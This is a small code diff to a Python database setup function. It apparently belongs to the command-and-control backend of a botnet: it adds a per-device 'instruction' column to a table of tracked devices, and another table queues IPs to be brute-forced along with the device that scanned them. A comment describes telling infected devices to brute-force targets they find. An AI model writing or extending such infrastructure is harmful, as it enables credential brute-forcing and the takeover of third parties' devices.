@@ -44,7 +44,8 @@ def db_init():
             memory      REAL,
             uptime      REAL,
             first_seen  TEXT,
-            last_seen   TEXT
+            last_seen   TEXT,
+            instruction TEXT
         );
 
         CREATE TABLE IF NOT EXISTS devices_tobrute (
@@ -52,7 +53,7 @@ def db_init():
             ip          TEXT UNIQUE,
             scanned_by_ip TEXT
         );
-    """)
+    """) # TODO:
     # scanned_by_ip is useful to keep if we want to tell the device who found it to also brute it
     con.commit()
     con.close()
